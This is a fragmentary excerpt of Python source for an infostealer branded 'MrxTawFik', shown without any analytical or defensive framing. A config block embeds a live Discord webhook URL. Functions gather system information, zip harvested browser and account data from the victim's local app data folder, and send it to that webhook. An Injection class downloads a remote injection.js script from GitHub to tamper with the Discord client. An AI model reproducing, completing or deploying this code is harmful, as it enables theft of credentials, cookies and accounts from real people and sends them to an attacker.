...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1064970455401910312/ShnLsQDec4xhOSM1SXIlYvo7Pic870QNJXmnNXU27tw6FOfLfQ-y2Ks4ZOvwL_HyXMvy', 'ping': False, 'pingtype': 'None', 'error': False, 'startup': False, 'defender': False, 'systeminfo': True, 'backupcodes': False, 'browser': True, 'roblox': False, 'obfuscation': False, 'injection': True, 'minecraft': False, 'wifi': False, 'killprotector': False, 'antidebug_vm': False, 'discord': False}
...
def main(webhook: str):
    ...
    if not __CONFIG__["roblox"] and not __CONFIG__["browser"] and not __CONFIG__["wifi"] and not __CONFIG__["minecraft"] and not __CONFIG__["backupcodes"]:
        webhook.send(content=content, avatar_url="https://cdn.discordapp.com/avatars/1055941612062126170/aa1b12a4ffcfbe5943e47c3c4f3ad44b.webp?size=128", username="MrxTawFik")
    else:
        zipup()
        _file = None
        _file = File(f'{localappdata}\\MrxTawFik-{os.getlogin()}.zip')
        webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/avatars/1055941612062126170/aa1b12a4ffcfbe5943e47c3c4f3ad44b.webp?size=128", username="MrxTawFik")
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="MrxTawFik", color=5639644)
        ...
        embed.add_field(
            ...
            inline=False)
        embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/1055941612062126170/aa1b12a4ffcfbe5943e47c3c4f3ad44b.webp?size=128")

        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/avatars/1055941612062126170/aa1b12a4ffcfbe5943e47c3c4f3ad44b.webp?size=128", username="MrxTawFik")
        ...
        if not __CONFIG__["roblox"]:
            ...
            try:
                if robo_cookie == "No Roblox Cookies Found":
                    ...
                    webhook.send(
                        avatar_url="https://cdn.discordapp.com/avatars/1055941612062126170/aa1b12a4ffcfbe5943e47c3c4f3ad44b.webp?size=128",
                        embed=embed,
                        username="MrxTawFik")
            except Exception:
                pass
...
def zipup():
    _zipfile = os.path.join(localappdata, f'MrxTawFik-{os.getlogin()}.zip')
...
class Injection:
    def __init__(self, webhook: str):
        ...
        self.code = requests.get("https://raw.githubusercontent.com/tawfik-pro/filejs/main/injection.js").text
